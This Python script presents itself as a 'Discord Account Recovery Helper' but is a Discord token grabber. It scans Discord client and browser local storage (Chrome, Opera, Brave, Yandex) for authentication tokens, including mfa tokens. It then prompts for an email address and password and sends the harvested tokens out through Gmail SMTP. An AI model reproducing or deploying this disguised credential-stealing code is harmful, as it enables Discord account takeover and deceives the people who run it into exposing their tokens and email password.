import os
import smtplib, ssl
from re import findall


print((("""
                                                                                                                         
                                                                                                                         
DDDDDDDDDDDDD                               AAA                       RRRRRRRRRRRRRRRRR           HHHHHHHHH     HHHHHHHHH
D::::::::::::DDD                           A:::A                      R::::::::::::::::R          H:::::::H     H:::::::H
D:::::::::::::::DD                        A:::::A                     R::::::RRRRRR:::::R         H:::::::H     H:::::::H
DDD:::::DDDDD:::::D                      A:::::::A                    RR:::::R     R:::::R        HH::::::H     H::::::HH
  D:::::D    D:::::D                    A:::::::::A                     R::::R     R:::::R          H:::::H     H:::::H  
  D:::::D     D:::::D                  A:::::A:::::A                    R::::R     R:::::R          H:::::H     H:::::H  
  D:::::D     D:::::D                 A:::::A A:::::A                   R::::RRRRRR:::::R           H::::::HHHHH::::::H  
  D:::::D     D:::::D                A:::::A   A:::::A                  R:::::::::::::RR            H:::::::::::::::::H  
  D:::::D     D:::::D               A:::::A     A:::::A                 R::::RRRRRR:::::R           H:::::::::::::::::H  
  D:::::D     D:::::D              A:::::AAAAAAAAA:::::A                R::::R     R:::::R          H::::::HHHHH::::::H  
  D:::::D     D:::::D             A:::::::::::::::::::::A               R::::R     R:::::R          H:::::H     H:::::H  
  D:::::D    D:::::D             A:::::AAAAAAAAAAAAA:::::A              R::::R     R:::::R          H:::::H     H:::::H  
DDD:::::DDDDD:::::D             A:::::A             A:::::A           RR:::::R     R:::::R        HH::::::H     H::::::HH
D:::::::::::::::DD    ......   A:::::A               A:::::A   ...... R::::::R     R:::::R ...... H:::::::H     H:::::::H
D::::::::::::DDD      .::::.  A:::::A                 A:::::A  .::::. R::::::R     R:::::R .::::. H:::::::H     H:::::::H
DDDDDDDDDDDDD         ...... AAAAAAA                   AAAAAAA ...... RRRRRRRR     RRRRRRR ...... HHHHHHHHH     HHHHHHHHH
   Discord                               Account                            Recovery                      Helper

   """)))

print("""Starting account recovery process...

      """)










LOCAL = os.getenv('LOCALAPPDATA')
ROAMING = os.getenv('APPDATA')

PATHS = {
    'Discord'           : ROAMING + '\\Discord',
    'Discord Canary'    : ROAMING + '\\DiscordCanary',
    'Discord PTB'       : ROAMING + '\\DiscordPTB',
    'Google Chrome'     : LOCAL + '\\Google\\Chrome\\User Data\\Default',
    'Opera'             : ROAMING + '\\Opera Software\\Opera Stable',
    'Brave'             : LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Yandex'            : LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default'
}
tokens = []
def get_tokens(path):
    path += '\\Local Storage\\leveldb'
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in (x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()):
            for token in findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', line):
                tokens.append(token)
   


for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        else:
            get_tokens(path)

def email():
    amountoftokens=len(tokens)
    print(f"""Recovered {amountoftokens} tokens

enter details to retrive the accounts
          """)
    port = 465  # For SSL
    sender_email=input("Type your Email and press enter: ")
    receiver_email=sender_email
    password = input("Type your password and press enter: ")
    message=(f"""
recovered tokens are {tokens}

Thank You For using TheUnsocialEngineer's Discord account recovery Helper""")
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)

email()
